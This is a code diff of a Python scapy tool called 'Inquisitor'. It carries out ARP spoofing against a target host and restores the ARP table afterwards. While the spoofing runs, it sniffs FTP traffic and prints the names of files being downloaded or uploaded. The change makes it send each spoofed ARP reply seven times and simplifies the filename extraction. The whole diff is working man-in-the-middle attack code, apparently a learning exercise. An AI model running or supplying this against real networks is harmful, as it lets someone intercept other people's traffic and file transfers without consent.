@@ -11,12 +11,12 @@ def error_exit(msg):
 
 def spoof(ip_target, mac_target, ip_src):
 	packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, op='is-at')
-	scapy.send(packet, verbose=0)
+	scapy.send(packet, verbose=0, count=7)
 	print(f" --- ARP Table soofed at {ip_target} --- ")
 
 def restore(ip_target, mac_target, ip_src, mac_src):
 	packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src, op='is-at')
-	scapy.send(packet, verbose=0)
+	scapy.send(packet, verbose=0, count=7)
 	print(f" --- ARP Table restored at {ip_target} --- ")
 
 class Inquisitor:
@@ -26,27 +26,13 @@ class Inquisitor:
 		self.ip_src = args.ip_src
 		self.mac_src = args.mac_src
 
-	def extract_file_name(self, data):
-		file_name = None
-		try:
-			ftp_command = data.decode('utf-8')
-			command_parts = ftp_command.split()
-
-			if len(command_parts) >= 2:
-				file_name = command_parts[1]
-		except UnicodeDecodeError:
-			pass
-
-		return file_name
-
 	def packet_callback(self, packet):
 		if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
 			payload = packet[scapy.Raw].load
-			if b"RETR" in payload or b"STOR" in payload:
-				ftp_command = payload.decode('utf-8')
-				file_name = self.extract_file_name(payload)
-				if file_name:
-					print(f"File: {file_name}")
+			if b"RETR" in payload:
+				print(f"Downloading: {payload.decode()[5:-2]}")
+			elif b"STOR" in payload:
+				print(f"Uploading: {payload.decode()[5:-2]}")
 
 	def exit_gracefully(self, signum, frame):
 		restore(self.ip_target, self.mac_target, self.ip_src, self.mac_src)
